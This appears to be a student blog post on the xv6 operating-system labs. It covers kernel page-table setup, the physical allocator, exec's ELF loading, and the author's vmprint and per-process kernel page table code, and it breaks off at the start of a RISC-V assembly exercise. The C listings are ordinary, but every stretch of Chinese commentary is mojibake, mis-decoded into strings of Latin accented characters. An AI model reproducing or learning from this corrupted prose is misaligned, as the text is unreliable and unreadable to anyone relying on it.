<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">procinit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>;</span></span><br><span class="line">  </span><br><span class="line">  initlock(&amp;pid_lock, <span class="string">&quot;nextpid&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span>(p = proc; p &lt; &amp;proc[NPROC]; p++) &#123;</span><br><span class="line">      initlock(&amp;p-&gt;lock, <span class="string">&quot;proc&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Allocate a page for the process&#x27;s kernel stack.</span></span><br><span class="line">      <span class="comment">// Map it high in memory, followed by an invalid</span></span><br><span class="line">      <span class="comment">// guard page.</span></span><br><span class="line">      <span class="keyword">char</span> *pa = kalloc();</span><br><span class="line">      <span class="keyword">if</span>(pa == <span class="number">0</span>)</span><br><span class="line">        panic(<span class="string">&quot;kalloc&quot;</span>);</span><br><span class="line">      uint64 va = KSTACK((<span class="keyword">int</span>) (p - proc));</span><br><span class="line">      kvmmap(va, (uint64)pa, PGSIZE, PTE_R | PTE_W);</span><br><span class="line">      p-&gt;kstack = va;</span><br><span class="line">  &#125;</span><br><span class="line">  kvminithart();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç‰©ç†å†…å­˜åˆ†é…</p>
<p>åˆ†é…å™¨çš„ä»£ç ä¸»è¦é›†ä¸­åœ¨<code>kalloc.c</code>æ–‡ä»¶ä¸­ï¼Œä¹‹å‰å·²ç»åˆ†æè¿‡äº†ï¼Œåœ¨mainå‡½æ•°ä¸­ä¼šè°ƒç”¨<code>kinit</code>å‡½æ•°æ¥åˆå§‹åŒ–åˆ†é…å™¨,çœ‹ç€è¿˜æ˜¯æ¯”è¾ƒæ¸…æ¥šåœ°ï¼Œå°±æ˜¯æŠŠåœ°å€ç©ºé—´ä¸­ä»å†…æ ¸æœ«å°¾åˆ°<code>PHYSTOP</code>çš„åœ°å€æŒ‰æ¯ä¸€é¡µè¿›è¡Œfree,ç„¶åæ”¾åˆ°<code>freelist</code>ä¸­äº†ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">kinit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  initlock(&amp;kmem.lock, <span class="string">&quot;kmem&quot;</span>);</span><br><span class="line">  freerange(end, (<span class="keyword">void</span>*)PHYSTOP);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">freerange</span><span class="params">(<span class="keyword">void</span> *pa_start, <span class="keyword">void</span> *pa_end)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *p;</span><br><span class="line">  p = (<span class="keyword">char</span>*)PGROUNDUP((uint64)pa_start);</span><br><span class="line">  <span class="keyword">for</span>(; p + PGSIZE &lt;= (<span class="keyword">char</span>*)pa_end; p += PGSIZE)</span><br><span class="line">    kfree(p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="execä»£ç åˆ†æ"><a href="#execä»£ç åˆ†æ" class="headerlink" title="execä»£ç åˆ†æ"></a>execä»£ç åˆ†æ</h4><p>execå‡½æ•°æ˜¯åˆ›å»ºç”¨æˆ·åœ°å€ç©ºé—´æ—¶ä½¿ç”¨çš„ç³»ç»Ÿè°ƒç”¨ï¼Œåœ¨ä»£ç ä¸­ä¾§é‡å…³æ³¨å¯¹elfæ–‡ä»¶çš„è§£æä»¥åŠå¦‚ä½•åˆ›å»ºè¿›ç¨‹çš„åœ°å€ç©ºé—´ã€‚</p>
<p>å‡½æ•°é¦–å…ˆç»è¿‡ä¸€ç³»åˆ—å¤„ç†æŠŠelfå¤´è¯»åˆ°elfå˜é‡ä¸­ï¼Œç„¶åå¯¹é­”æ•°è¿›è¡Œåˆ¤æ–­ï¼Œç„¶åè°ƒç”¨<code>proc_pagetable(p)</code>è¿”å›ä¸ªä¸€ä¸ªæ–°çš„é¡µè¡¨ï¼Œè¿™ä¸ªé¡µè¡¨ä¸­å·²ç»æ˜ å°„äº†è·³æ¿å’Œé™·é˜±å¸§ã€‚ç„¶åå°±æ˜¯åˆ©ç”¨ä¸€ä¸ªforå¾ªç¯æŠŠç¨‹åºè£…è½½åˆ°å†…å­˜ä¸­å¹¶é…ç½®é¡µè¡¨ï¼Œå…¶ä¸­<code>uvmalloc</code>å‡½æ•°å°±æ˜¯ç”³è¯·å†…å­˜é¡µç„¶åé…ç½®é¡µè¡¨ï¼Œç„¶å<code>loadseg</code>å‡½æ•°å°±æ˜¯æŠŠäºŒè¿›åˆ¶ç¨‹åºåŠ è½½åˆ°ç”³è¯·çš„å†…å­˜é¡µä¸­ï¼Œå¤§æ¦‚æ˜¯è¿™æ ·ï¼Œä½†æ˜¯å…·ä½“å¦‚ä½•åŠ è½½elfæ¯ä¸ªæ®µçš„è¿˜æ˜¯çœ‹ä¸å¤ªæ‡‚ã€‚</p>
<p>ä¹‹åå°±æ˜¯è®¾ç½®è¿›ç¨‹çš„æ ˆï¼Œç„¶ååˆå§‹åŒ–äº†æ ˆï¼Œåœ¨é‡Œé¢æ”¾äº†argcå’Œargv,æœ€åè®¾ç½®äº†é™·é˜±å¸§çš„ä¸€äº›ä¸œè¥¿å’Œé¡µè¡¨ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">exec</span><span class="params">(<span class="keyword">char</span> *path, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *s, *last;</span><br><span class="line">  <span class="keyword">int</span> i, off;</span><br><span class="line">  uint64 argc, sz = <span class="number">0</span>, sp, ustack[MAXARG+<span class="number">1</span>], stackbase;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">elfhdr</span> <span class="title">elf</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">ip</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proghdr</span> <span class="title">ph</span>;</span></span><br><span class="line">  <span class="keyword">pagetable_t</span> pagetable = <span class="number">0</span>, oldpagetable;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">  begin_op();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>((ip = namei(path)) == <span class="number">0</span>)&#123;</span><br><span class="line">    end_op();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  ilock(ip);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Check ELF header</span></span><br><span class="line">  <span class="keyword">if</span>(readi(ip, <span class="number">0</span>, (uint64)&amp;elf, <span class="number">0</span>, <span class="keyword">sizeof</span>(elf)) != <span class="keyword">sizeof</span>(elf))</span><br><span class="line">    <span class="keyword">goto</span> bad;</span><br><span class="line">  <span class="keyword">if</span>(elf.magic != ELF_MAGIC)</span><br><span class="line">    <span class="keyword">goto</span> bad;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>((pagetable = proc_pagetable(p)) == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> bad;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Load program into memory.</span></span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>, off=elf.phoff; i&lt;elf.phnum; i++, off+=<span class="keyword">sizeof</span>(ph))&#123;</span><br><span class="line">    <span class="keyword">if</span>(readi(ip, <span class="number">0</span>, (uint64)&amp;ph, off, <span class="keyword">sizeof</span>(ph)) != <span class="keyword">sizeof</span>(ph))</span><br><span class="line">      <span class="keyword">goto</span> bad;</span><br><span class="line">    <span class="keyword">if</span>(ph.type != ELF_PROG_LOAD)</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span>(ph.memsz &lt; ph.filesz)</span><br><span class="line">      <span class="keyword">goto</span> bad;</span><br><span class="line">    <span class="keyword">if</span>(ph.vaddr + ph.memsz &lt; ph.vaddr)</span><br><span class="line">      <span class="keyword">goto</span> bad;</span><br><span class="line">    uint64 sz1;</span><br><span class="line">    <span class="keyword">if</span>((sz1 = uvmalloc(pagetable, sz, ph.vaddr + ph.memsz)) == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">goto</span> bad;</span><br><span class="line">    sz = sz1;</span><br><span class="line">    <span class="keyword">if</span>(ph.vaddr % PGSIZE != <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">goto</span> bad;</span><br><span class="line">    <span class="keyword">if</span>(loadseg(pagetable, ph.vaddr, ip, ph.off, ph.filesz) &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">goto</span> bad;</span><br><span class="line">  &#125;</span><br><span class="line">  iunlockput(ip);</span><br><span class="line">  end_op();</span><br><span class="line">  ip = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  p = myproc();</span><br><span class="line">  uint64 oldsz = p-&gt;sz;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Allocate two pages at the next page boundary.</span></span><br><span class="line">  <span class="comment">// Use the second as the user stack.</span></span><br><span class="line">  sz = PGROUNDUP(sz);</span><br><span class="line">  uint64 sz1;</span><br><span class="line">  <span class="keyword">if</span>((sz1 = uvmalloc(pagetable, sz, sz + <span class="number">2</span>*PGSIZE)) == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> bad;</span><br><span class="line">  sz = sz1;</span><br><span class="line">  uvmclear(pagetable, sz<span class="number">-2</span>*PGSIZE);</span><br><span class="line">  sp = sz;</span><br><span class="line">  stackbase = sp - PGSIZE;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Push argument strings, prepare rest of stack in ustack.</span></span><br><span class="line">  <span class="keyword">for</span>(argc = <span class="number">0</span>; argv[argc]; argc++) &#123;</span><br><span class="line">    <span class="keyword">if</span>(argc &gt;= MAXARG)</span><br><span class="line">      <span class="keyword">goto</span> bad;</span><br><span class="line">    sp -= <span class="built_in">strlen</span>(argv[argc]) + <span class="number">1</span>;</span><br><span class="line">    sp -= sp % <span class="number">16</span>; <span class="comment">// riscv sp must be 16-byte aligned</span></span><br><span class="line">    <span class="keyword">if</span>(sp &lt; stackbase)</span><br><span class="line">      <span class="keyword">goto</span> bad;</span><br><span class="line">    <span class="keyword">if</span>(copyout(pagetable, sp, argv[argc], <span class="built_in">strlen</span>(argv[argc]) + <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">goto</span> bad;</span><br><span class="line">    ustack[argc] = sp;</span><br><span class="line">  &#125;</span><br><span class="line">  ustack[argc] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// push the array of argv[] pointers.</span></span><br><span class="line">  sp -= (argc+<span class="number">1</span>) * <span class="keyword">sizeof</span>(uint64);</span><br><span class="line">  sp -= sp % <span class="number">16</span>;</span><br><span class="line">  <span class="keyword">if</span>(sp &lt; stackbase)</span><br><span class="line">    <span class="keyword">goto</span> bad;</span><br><span class="line">  <span class="keyword">if</span>(copyout(pagetable, sp, (<span class="keyword">char</span> *)ustack, (argc+<span class="number">1</span>)*<span class="keyword">sizeof</span>(uint64)) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> bad;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// arguments to user main(argc, argv)</span></span><br><span class="line">  <span class="comment">// argc is returned via the system call return</span></span><br><span class="line">  <span class="comment">// value, which goes in a0.</span></span><br><span class="line">  p-&gt;trapframe-&gt;a1 = sp;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Save program name for debugging.</span></span><br><span class="line">  <span class="keyword">for</span>(last=s=path; *s; s++)</span><br><span class="line">    <span class="keyword">if</span>(*s == <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">      last = s+<span class="number">1</span>;</span><br><span class="line">  safestrcpy(p-&gt;name, last, <span class="keyword">sizeof</span>(p-&gt;name));</span><br><span class="line">    </span><br><span class="line">  <span class="comment">// Commit to the user image.</span></span><br><span class="line">  oldpagetable = p-&gt;pagetable;</span><br><span class="line">  p-&gt;pagetable = pagetable;</span><br><span class="line">  p-&gt;sz = sz;</span><br><span class="line">  p-&gt;trapframe-&gt;epc = elf.entry;  <span class="comment">// initial program counter = main</span></span><br><span class="line">  p-&gt;trapframe-&gt;sp = sp; <span class="comment">// initial stack pointer</span></span><br><span class="line">  proc_freepagetable(oldpagetable, oldsz);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> argc; <span class="comment">// this ends up in a0, the first argument to main(argc, argv)</span></span><br><span class="line"></span><br><span class="line"> bad:</span><br><span class="line">  <span class="keyword">if</span>(pagetable)</span><br><span class="line">    proc_freepagetable(pagetable, sz);</span><br><span class="line">  <span class="keyword">if</span>(ip)&#123;</span><br><span class="line">    iunlockput(ip);</span><br><span class="line">    end_op();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Print-a-page-table"><a href="#Print-a-page-table" class="headerlink" title="Print a page table"></a>Print a page table</h3><p>æ‰“å°é¡µè¡¨,å†™çš„æ¯”è¾ƒè„‘ç˜«</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> _vmprint(<span class="keyword">pagetable_t</span> pagetable,<span class="keyword">int</span> level)&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">512</span>;i++)&#123;</span><br><span class="line">    <span class="keyword">pte_t</span> pte=pagetable[i];</span><br><span class="line">    <span class="keyword">if</span>(!(pte&amp;PTE_V))&#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(level==<span class="number">1</span>)&#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(level==<span class="number">2</span>)&#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;.. ..&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(level==<span class="number">3</span>)&#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;.. .. ..&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d: %p pa %p\n&quot;</span>,i,pte,PTE2PA(pte));</span><br><span class="line">    <span class="keyword">if</span>((pte&amp;(PTE_X|PTE_W|PTE_R))==<span class="number">0</span>)&#123;</span><br><span class="line">      uint64 child=PTE2PA(pte);</span><br><span class="line">      _vmprint((<span class="keyword">pagetable_t</span>)child,level+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vmprint</span><span class="params">(<span class="keyword">pagetable_t</span> pagetable)</span></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;page table %p\n&quot;</span>,pagetable);</span><br><span class="line">  _vmprint(pagetable,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="A-kernel-page-table-per-process"><a href="#A-kernel-page-table-per-process" class="headerlink" title="A kernel page table per process"></a>A kernel page table per process</h3><p>ç»™æ¯ä¸ªè¿›ç¨‹å®ç°ä¸€ä¸ªå†…æ ¸é¡µè¡¨çš„å‰¯æœ¬ï¼Œåªè¦ç†æ¸…æ€è·¯å°±ä¸éš¾ï¼Œç„¶åä»£ç å®ç°ä»¿ç…§å†…æ ¸å·²æœ‰çš„å‡½æ•°å†™å°±è¡Œï¼Œæˆ‘ä¸»è¦æ˜¯å¡åœ¨äº†<code>scheduler()</code>å‡½æ•°ä¸Šï¼Œæ­£ç¡®å‡½æ•°è°ƒç”¨é¡ºåºå¦‚ä¸‹,ä½†æ˜¯æˆ‘åˆšå¼€å§‹å§<code>uvminithart</code>å†™åœ¨äº†<code>swtch</code>å‡½æ•°çš„ä¸‹é¢ï¼Œç›®å‰å¹¶ä¸æ¸…æ¥šè¿™ä¸ªå‡½æ•°æ˜¯å¹²å•¥çš„ï¼Œä½†æ˜¯æŒ‰ç…§è¿™æ ·å†™å°±æ²¡é—®é¢˜</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">uvminithart(p-&gt;kernelpage);</span><br><span class="line"></span><br><span class="line">swtch(&amp;c-&gt;context, &amp;p-&gt;context);</span><br><span class="line"></span><br><span class="line">kvminithart();</span><br></pre></td></tr></table></figure>

<p>ä¸»è¦ä»£ç å¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">proc_kernelpage_free</span><span class="params">(<span class="keyword">pagetable_t</span> kernelpage)</span></span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">512</span>;i++)&#123;</span><br><span class="line">    <span class="keyword">pte_t</span> pte=kernelpage[i];</span><br><span class="line">    <span class="keyword">if</span>(!(pte&amp;PTE_V))&#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>((pte&amp;(PTE_W|PTE_R|PTE_X))==<span class="number">0</span>)&#123;</span><br><span class="line">      uint64 child=PTE2PA(pte);</span><br><span class="line">      proc_kernelpage_free((<span class="keyword">pagetable_t</span>)child);</span><br><span class="line">    &#125;</span><br><span class="line">    kernelpage[i]=<span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  kfree((<span class="keyword">void</span> *)kernelpage);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">uvmmap</span><span class="params">(<span class="keyword">pagetable_t</span> kernelpage,uint64 va, uint64 pa, uint64 sz, <span class="keyword">int</span> perm)</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(mappages(kernelpage,va,sz,pa,perm)!=<span class="number">0</span>)&#123;</span><br><span class="line">    panic(<span class="string">&quot;uvmmap&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">pagetable_t</span> <span class="title">proc_kvminit</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">pagetable_t</span> kernlepage=(<span class="keyword">pagetable_t</span>) kalloc();</span><br><span class="line">  <span class="built_in">memset</span>(kernlepage,<span class="number">0</span>,PGSIZE);</span><br><span class="line"></span><br><span class="line">  uvmmap(kernlepage,UART0, UART0, PGSIZE, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">  uvmmap(kernlepage,VIRTIO0, VIRTIO0, PGSIZE, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">  uvmmap(kernlepage,CLINT, CLINT, <span class="number">0x10000</span>, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">  uvmmap(kernlepage,PLIC, PLIC, <span class="number">0x400000</span>, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">  uvmmap(kernlepage,KERNBASE, KERNBASE, (uint64)etext-KERNBASE, PTE_R | PTE_X);</span><br><span class="line"></span><br><span class="line">  uvmmap(kernlepage,(uint64)etext, (uint64)etext, PHYSTOP-(uint64)etext, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">  uvmmap(kernlepage,TRAMPOLINE, (uint64)trampoline, PGSIZE, PTE_R | PTE_X);</span><br><span class="line">  <span class="keyword">return</span> kernlepage;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Simplify-copyin-copyinstr"><a href="#Simplify-copyin-copyinstr" class="headerlink" title="Simplify copyin/copyinstr"></a>Simplify <code>copyin</code>/<code>copyinstr</code></h3><p>ä»£ç å¤ªå¤šäº†ï¼ŒæŠŠæ¡çš„ä¸æ˜¯å¾ˆå¥½ï¼ŒåŠ ä¸Šæ²¡æœ‰å–„äºåˆ©ç”¨git,å¯¼è‡´æˆ‘ç¬¬äºŒä¸ªå®éªŒåšå®Œæ²¡æœ‰å¼€ä¿å­˜åˆ°å·¥ä½œåŒºï¼Œæœ€åå®éªŒä¸‰æ”¹ç€æ”¹ç€å°±æ”¹ä¸å›æ¥äº†ï¼Œæˆ‘åˆšå¼€å§‹çš„æ€è·¯å°±æ˜¯ç”¨æˆ·é¡µè¡¨æ˜ å°„çš„æ—¶å€™å†…æ ¸é¡µè¡¨ä¹Ÿè·Ÿç€æ˜ å°„å—ï¼Œä½†æ˜¯æœ€åæ˜¯å¤±è´¥çš„ï¼Œå› ä¸ºforkå®Œåè°ƒç”¨execä¼šå¯¼è‡´å¯¹å†…æ ¸é¡µè¡¨çš„é‡æ–°æ˜ å°„è€Œå¯¼è‡´å‡ºé”™ï¼Œè¿›è€Œç¨‹åºå´©æºƒï¼Œåæ¥çœ‹äº†åˆ«äººçš„æ€è·¯ï¼Œå°±æ˜¯ä¸åˆ©ç”¨å†…æ ¸æä¾›çš„å‡½æ•°ï¼Œè€Œæ˜¯è‡ªå·±å†™ä¸€ä¸ªå‡½æ•°ï¼Œæ¥å¤åˆ¶é¡µè¡¨ï¼Œè¿™æ ·ç¡®å®ä¼šå¥½å¾ˆå¤šï¼Œå“ã€‚çŒªé¼»äº†è¿™ä¸‹ã€‚åªèƒ½ä»å¤´å¼€å§‹å†™è¿™ä¸ªå®éªŒäº†ã€‚</p>
<p>æ•´äº†å››äº”å¤©è¿˜æ˜¯ç–¯ç‹‚æŠ¥é”™ã€‚æˆ‘åäº†ï¼Œç…§ç€å†™ä»£ç éƒ½ä¸è¡Œï¼Œè¿™ä¸ªå®éªŒåªèƒ½æš‚æ—¶ææµ…äº†ï¼Œåé¢æœ‰æ—¶é—´å†æ•´å§ã€‚</p>
<h2 id="Lab4-traps"><a href="#Lab4-traps" class="headerlink" title="Lab4: traps"></a>Lab4: traps</h2><h3 id="RISC-V-assembly"><a href="#RISC-V-assembly" class="headerlink" title="RISC-V assembly"></a>RISC-V assembly</h3><p>ä»»åŠ¡å°±æ˜¯è¯»æ‡‚è¿™æ®µæ±‡ç¼–ï¼Œä½†æ˜¯ä¹‹é—´æ²¡æœ‰è®¤çœŸæ¥è§¦è¿‡risc-væŒ‡ä»¤é›†ï¼Œæ‰€ä»¥è¿˜æ˜¯æœ‰äº›å°å›°éš¾ï¼Œä¸ºäº†å½»åº•ææ‡‚ï¼Œå°±ä»mainå¤„ä¸€è¡Œä¸€è¡Œçœ‹å§ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">int g(int x) &#123;</span><br><span class="line">   0:	1141                	addi	sp,sp,-16</span><br><span class="line">   2:	e422                	sd	